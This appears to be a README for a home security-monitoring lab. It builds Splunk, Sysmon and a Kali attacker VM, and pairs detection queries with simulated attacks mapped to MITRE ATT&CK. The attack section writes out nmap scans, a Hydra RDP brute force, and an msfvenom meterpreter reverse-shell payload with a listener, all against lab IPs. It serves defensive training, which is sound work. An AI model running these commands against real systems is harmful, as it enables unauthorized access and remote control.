---

## Technologies Used

| Tool | Purpose |
|------|---------|
| Oracle VirtualBox | Hypervisor for all VMs |
| Kali Linux | Attacker machine (pre-installed tools) |
| Windows 10 | Target / victim machine |
| Splunk Enterprise | SIEM for log ingestion, searching, and alerting |
| Splunk Universal Forwarder | Lightweight agent on Windows to forward logs |
| Sysmon | Advanced endpoint logging (process, network, file changes) |
| Nmap | Network discovery & port scanning |
| Hydra | Password brute-forcing (RDP, SSH, etc.) |
| Metasploit | Reverse shell payload generation & exploitation |

---

## Prerequisites

- **Host machine** with at least 16 GB RAM and 50 GB free disk space
- **Oracle VirtualBox** (latest version) with Extension Pack
- ISO images:
  - [Kali Linux](https://www.kali.org/get-kali/)
  - [Windows 10](https://www.microsoft.com/software-download/windows10ISO)
  -[splunkUniversal Forwarder](https://www.splunk.com/en_us/download/universal-forwarder.html)




### 1. Virtual Machine Configuration

| VM | vCPUs | RAM | Network 
|----|-------|-----|---------|-----|
| Kali Linux | 2 | 2 GB | NAT Network 
| Windows 10 | 2 | 4 GB | NAT Network 

Create a **NAT Network** in VirtualBox so all VMs can communicate. 
After installing each OS, verify connectivity with `ping 10.0.2.5` from Windows.


### 2. Install Splunk Enterprise (windows 10 VM machine)

-[splunk Enterprise](https://www.splunk.com/en_us/products/splunk-enterprise.html)

Access the Splunk web interface at **http://10.0.2.5:8000**



### 3. Install Splunk Universal Forwarder (Windows 10)

Download the Windows `.msi` from Splunk and install with default options.

**`C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf`**

```ini
[tcpout]
defaultGroup = splunk_indexer

[tcpout:splunk_indexer]
server = 10.0.2.5:9997
sslVerifyServerCert = false
```

**`C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`**

```ini
[WinEventLog://Security]
disabled = false
index = endpoint

[WinEventLog://System]
disabled = false
index = endpoint
```

Restart the forwarder service:

```cmd
net stop SplunkForwarder
net start SplunkForwarder
```
      (OR)

## 3. Forward Logs to Splunk Enterprise

->Step 1: Open Splunk Universal Forwarder Directory

Go to:
**'C:\Program Files\SplunkUniversalForwarder'**

->Step 2: Navigate to Local Configuration Folder

Open the following folders:
etc → system → local

Full path:
C:\Program Files\SplunkUniversalForwarder\etc\system\local

->Step 3: Create inputs.conf
Inside the local folder:
Right-click
Create a new text file
Rename it as:
inputs.conf

->Step 4: Add Configuration

Open inputs.conf in Notepad and paste the following configuration:
```ini
[WinEventLog://Application]
index = endpoint
disabled = false

[WinEventLog://Security]
index = endpoint
disabled = false

[WinEventLog://System]
index = endpoint
disabled = false

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = endpoint
disabled = false
renderXml = true
```

->Step 5: Restart Splunk Universal Forwarder

Open Command Prompt as Administrator and run:
```cmd
net stop SplunkForwarder
net start SplunkForwarder
```

->Step 6: Verify Logs in Splunk Enterprise

Search the following in Splunk Enterprise:
```init
index=endpoint
```
You should now see:

Application logs
Security logs
System logs
Sysmon logs


### 4. Install Sysmon (Windows 10)

Download [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) from Microsoft Sysinternals. Run as Administrator:

```cmd
sysmon64 -accepteula -i sysmonconfig.xml
```

> Use a community config such as [SwiftOnSecurity's sysmonconfig](https://github.com/SwiftOnSecurity/sysmon-config) for comprehensive coverage.

Sysmon events will appear under `Applications and Services Logs → Microsoft → Windows → Sysmon → Operational` and are automatically picked up by the Universal Forwarder.




## Attacks Simulated & MITRE ATT&CK Mapping

| Attack | MITRE ID | Tactic | Detection Method |
|--------|----------|--------|-----------------|
| Nmap Port Scan | T1046 | Discovery (TA0007) | Event ID 5156 — 10+ distinct destination ports from one source in 1 minute |
| RDP Brute Force | T1110 | Credential Access (TA0006) | Event ID 4625 — 10+ failed logins in 5 minutes via RDP |
| Reverse Shell (Metasploit) | T1573 | Command & Control (TA0011) | Sysmon Event ID 1 + Event ID 3 — anomalous parent-child process relationships |

---

## Splunk Detection Queries

### Port Scan Detection (T1046)

```spl
index=endpoint EventCode=5156
| bin _time span=1m
| stats dc(Destination_Port) as distinct_ports by Source_IP, _time
| where distinct_ports > 10
| sort - distinct_ports
```

> **Expected result:** Kali IP (10.0.2.10) shows >10 distinct ports scanned within a single minute.

---

### RDP Brute Force Detection (T1110)

```spl
index=endpoint EventCode=4625 Logon_Type=10
| bin _time span=5m
| stats count by Source_Network_Address, _time
| where count > 10
| rename count as failed_attempts
```

> `Logon_Type=10` filters for Remote Interactive (RDP) logons only.

---

### Reverse Shell Detection (T1573)

```spl
index=endpoint EventCode=3 Destination_Port > 1024
    (Image="*\\cmd.exe" OR Image="*\\powershell.exe")
| table _time, Source_IP, Destination_IP, Destination_Port, Image
```

---

## Running the Attacks (from Kali Linux)

### 1. Port Scan

```bash
nmap -sT 10.0.2.15    # TCP connect scan
nmap -sS 10.0.2.15    # SYN scan (requires root)
nmap -sF 10.0.2.15    # FIN scan (stealth)
```

### 2. RDP Brute Force

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.2.15
```

### 3. Reverse Shell (Metasploit)

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=10.0.2.10 LPORT=4444 -f exe -o shell.exe

# Serve the file to Windows
python3 -m http.server 8080

# Set up listener in msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.2.10
set LPORT 4444
exploit
```

Execute `shell.exe` on the Windows target and observe Sysmon events in Splunk.

---

## Investigation Dashboard

Navigate to **Dashboards → Create New Dashboard** in Splunk and add one panel per detection query. Suggested layout:

- **Port Scans (T1046)** — bar chart by Source IP
- **Failed Logins (T1110)** — timeline of failed RDP attempts
- **Suspicious Outbound Connections (T1573)** — table of process + destination

---

## Future Improvements

- Add **Zeek** (formerly Bro) for network traffic monitoring
- Integrate **TheHive** for structured case management
- Generate attack emulations with **Caldera** or **Atomic Red Team**
- Configure Splunk alerts to push notifications to **Slack** or **Microsoft Teams**

---

## References

- [Splunk Search Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- [Sysmon Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Nmap Network Scanning](https://nmap.org/book/)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)

---

## License

This project is for **educational and research purposes only**. Use it to learn detection and response techniques in a safe, isolated lab environment.

---

*Happy Hunting! 🔍*
